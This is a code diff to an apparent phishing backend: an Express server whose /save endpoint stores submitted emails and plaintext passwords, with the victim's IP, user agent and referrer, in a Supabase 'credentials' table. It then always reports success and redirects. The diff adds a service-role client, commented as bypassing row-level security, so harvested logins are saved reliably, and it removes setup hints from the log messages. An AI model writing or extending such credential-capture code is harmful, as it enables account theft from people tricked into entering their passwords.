@@ -7,18 +7,31 @@ const app = express();
 
 // Supabase setup with error handling
 const supabaseUrl = process.env.SUPABASE_URL;
-const supabaseKey = process.env.SUPABASE_ANON_KEY;
+const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;
+const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
 let supabase = null;
+let supabaseService = null;
 
 console.log('Supabase URL:', supabaseUrl ? 'Set' : 'NOT SET');
-console.log('Supabase Key:', supabaseKey ? 'Set' : 'NOT SET');
+console.log('Supabase Anon Key:', supabaseAnonKey ? 'Set' : 'NOT SET');
+console.log('Supabase Service Key:', supabaseServiceKey ? 'Set' : 'NOT SET');
 
-if (supabaseUrl && supabaseKey) {
+if (supabaseUrl && supabaseAnonKey) {
   try {
-    supabase = createClient(supabaseUrl, supabaseKey);
+    supabase = createClient(supabaseUrl, supabaseAnonKey);
     console.log('Supabase client initialized successfully');
   } catch (error) {
     console.error('Failed to initialize Supabase:', error.message);
+  }
+}
+
+// Use service role key if available (bypasses RLS)
+if (supabaseUrl && supabaseServiceKey) {
+  try {
+    supabaseService = createClient(supabaseUrl, supabaseServiceKey);
+    console.log('Supabase service client initialized successfully');
+  } catch (error) {
+    console.error('Failed to initialize Supabase service client:', error.message);
   }
 }
 
@@ -30,8 +43,10 @@ app.get('/health', (req, res) => {
   res.json({
     status: 'ok',
     supabase_configured: !!supabase,
+    supabase_service_configured: !!supabaseService,
     supabase_url: supabaseUrl ? 'Set' : 'NOT SET',
-    supabase_key: supabaseKey ? 'Set' : 'NOT SET'
+    supabase_anon_key: supabaseAnonKey ? 'Set' : 'NOT SET',
+    supabase_service_key: supabaseServiceKey ? 'Set' : 'NOT SET'
   });
 });
 
@@ -109,10 +124,12 @@ app.post('/save', async (req, res) => {
   const credentialData = { email, password, timestamp, ip, user_agent: userAgent, referrer };
   let saved = false;
 
-  // Try to save to Supabase if configured
-  if (supabase) {
+  // Try service role client first (bypasses RLS), then fall back to anon
+  const clientToUse = supabaseService || supabase;
+
+  if (clientToUse) {
     try {
-      const { data, error } = await supabase
+      const { data, error } = await clientToUse
         .from('credentials')
         .insert([credentialData]);
 
@@ -126,11 +143,11 @@ app.post('/save', async (req, res) => {
       console.error('Exception saving to Supabase:', error.message);
     }
   } else {
-    console.warn('Supabase not configured - please set SUPABASE_URL and SUPABASE_ANON_KEY on Vercel');
+    console.warn('Supabase not configured');
   }
 
   if (!saved) {
-    console.log('Credential captured (Supabase offline):', email);
+    console.log('Credential captured:', email);
   }
 
   // Always return success and redirect
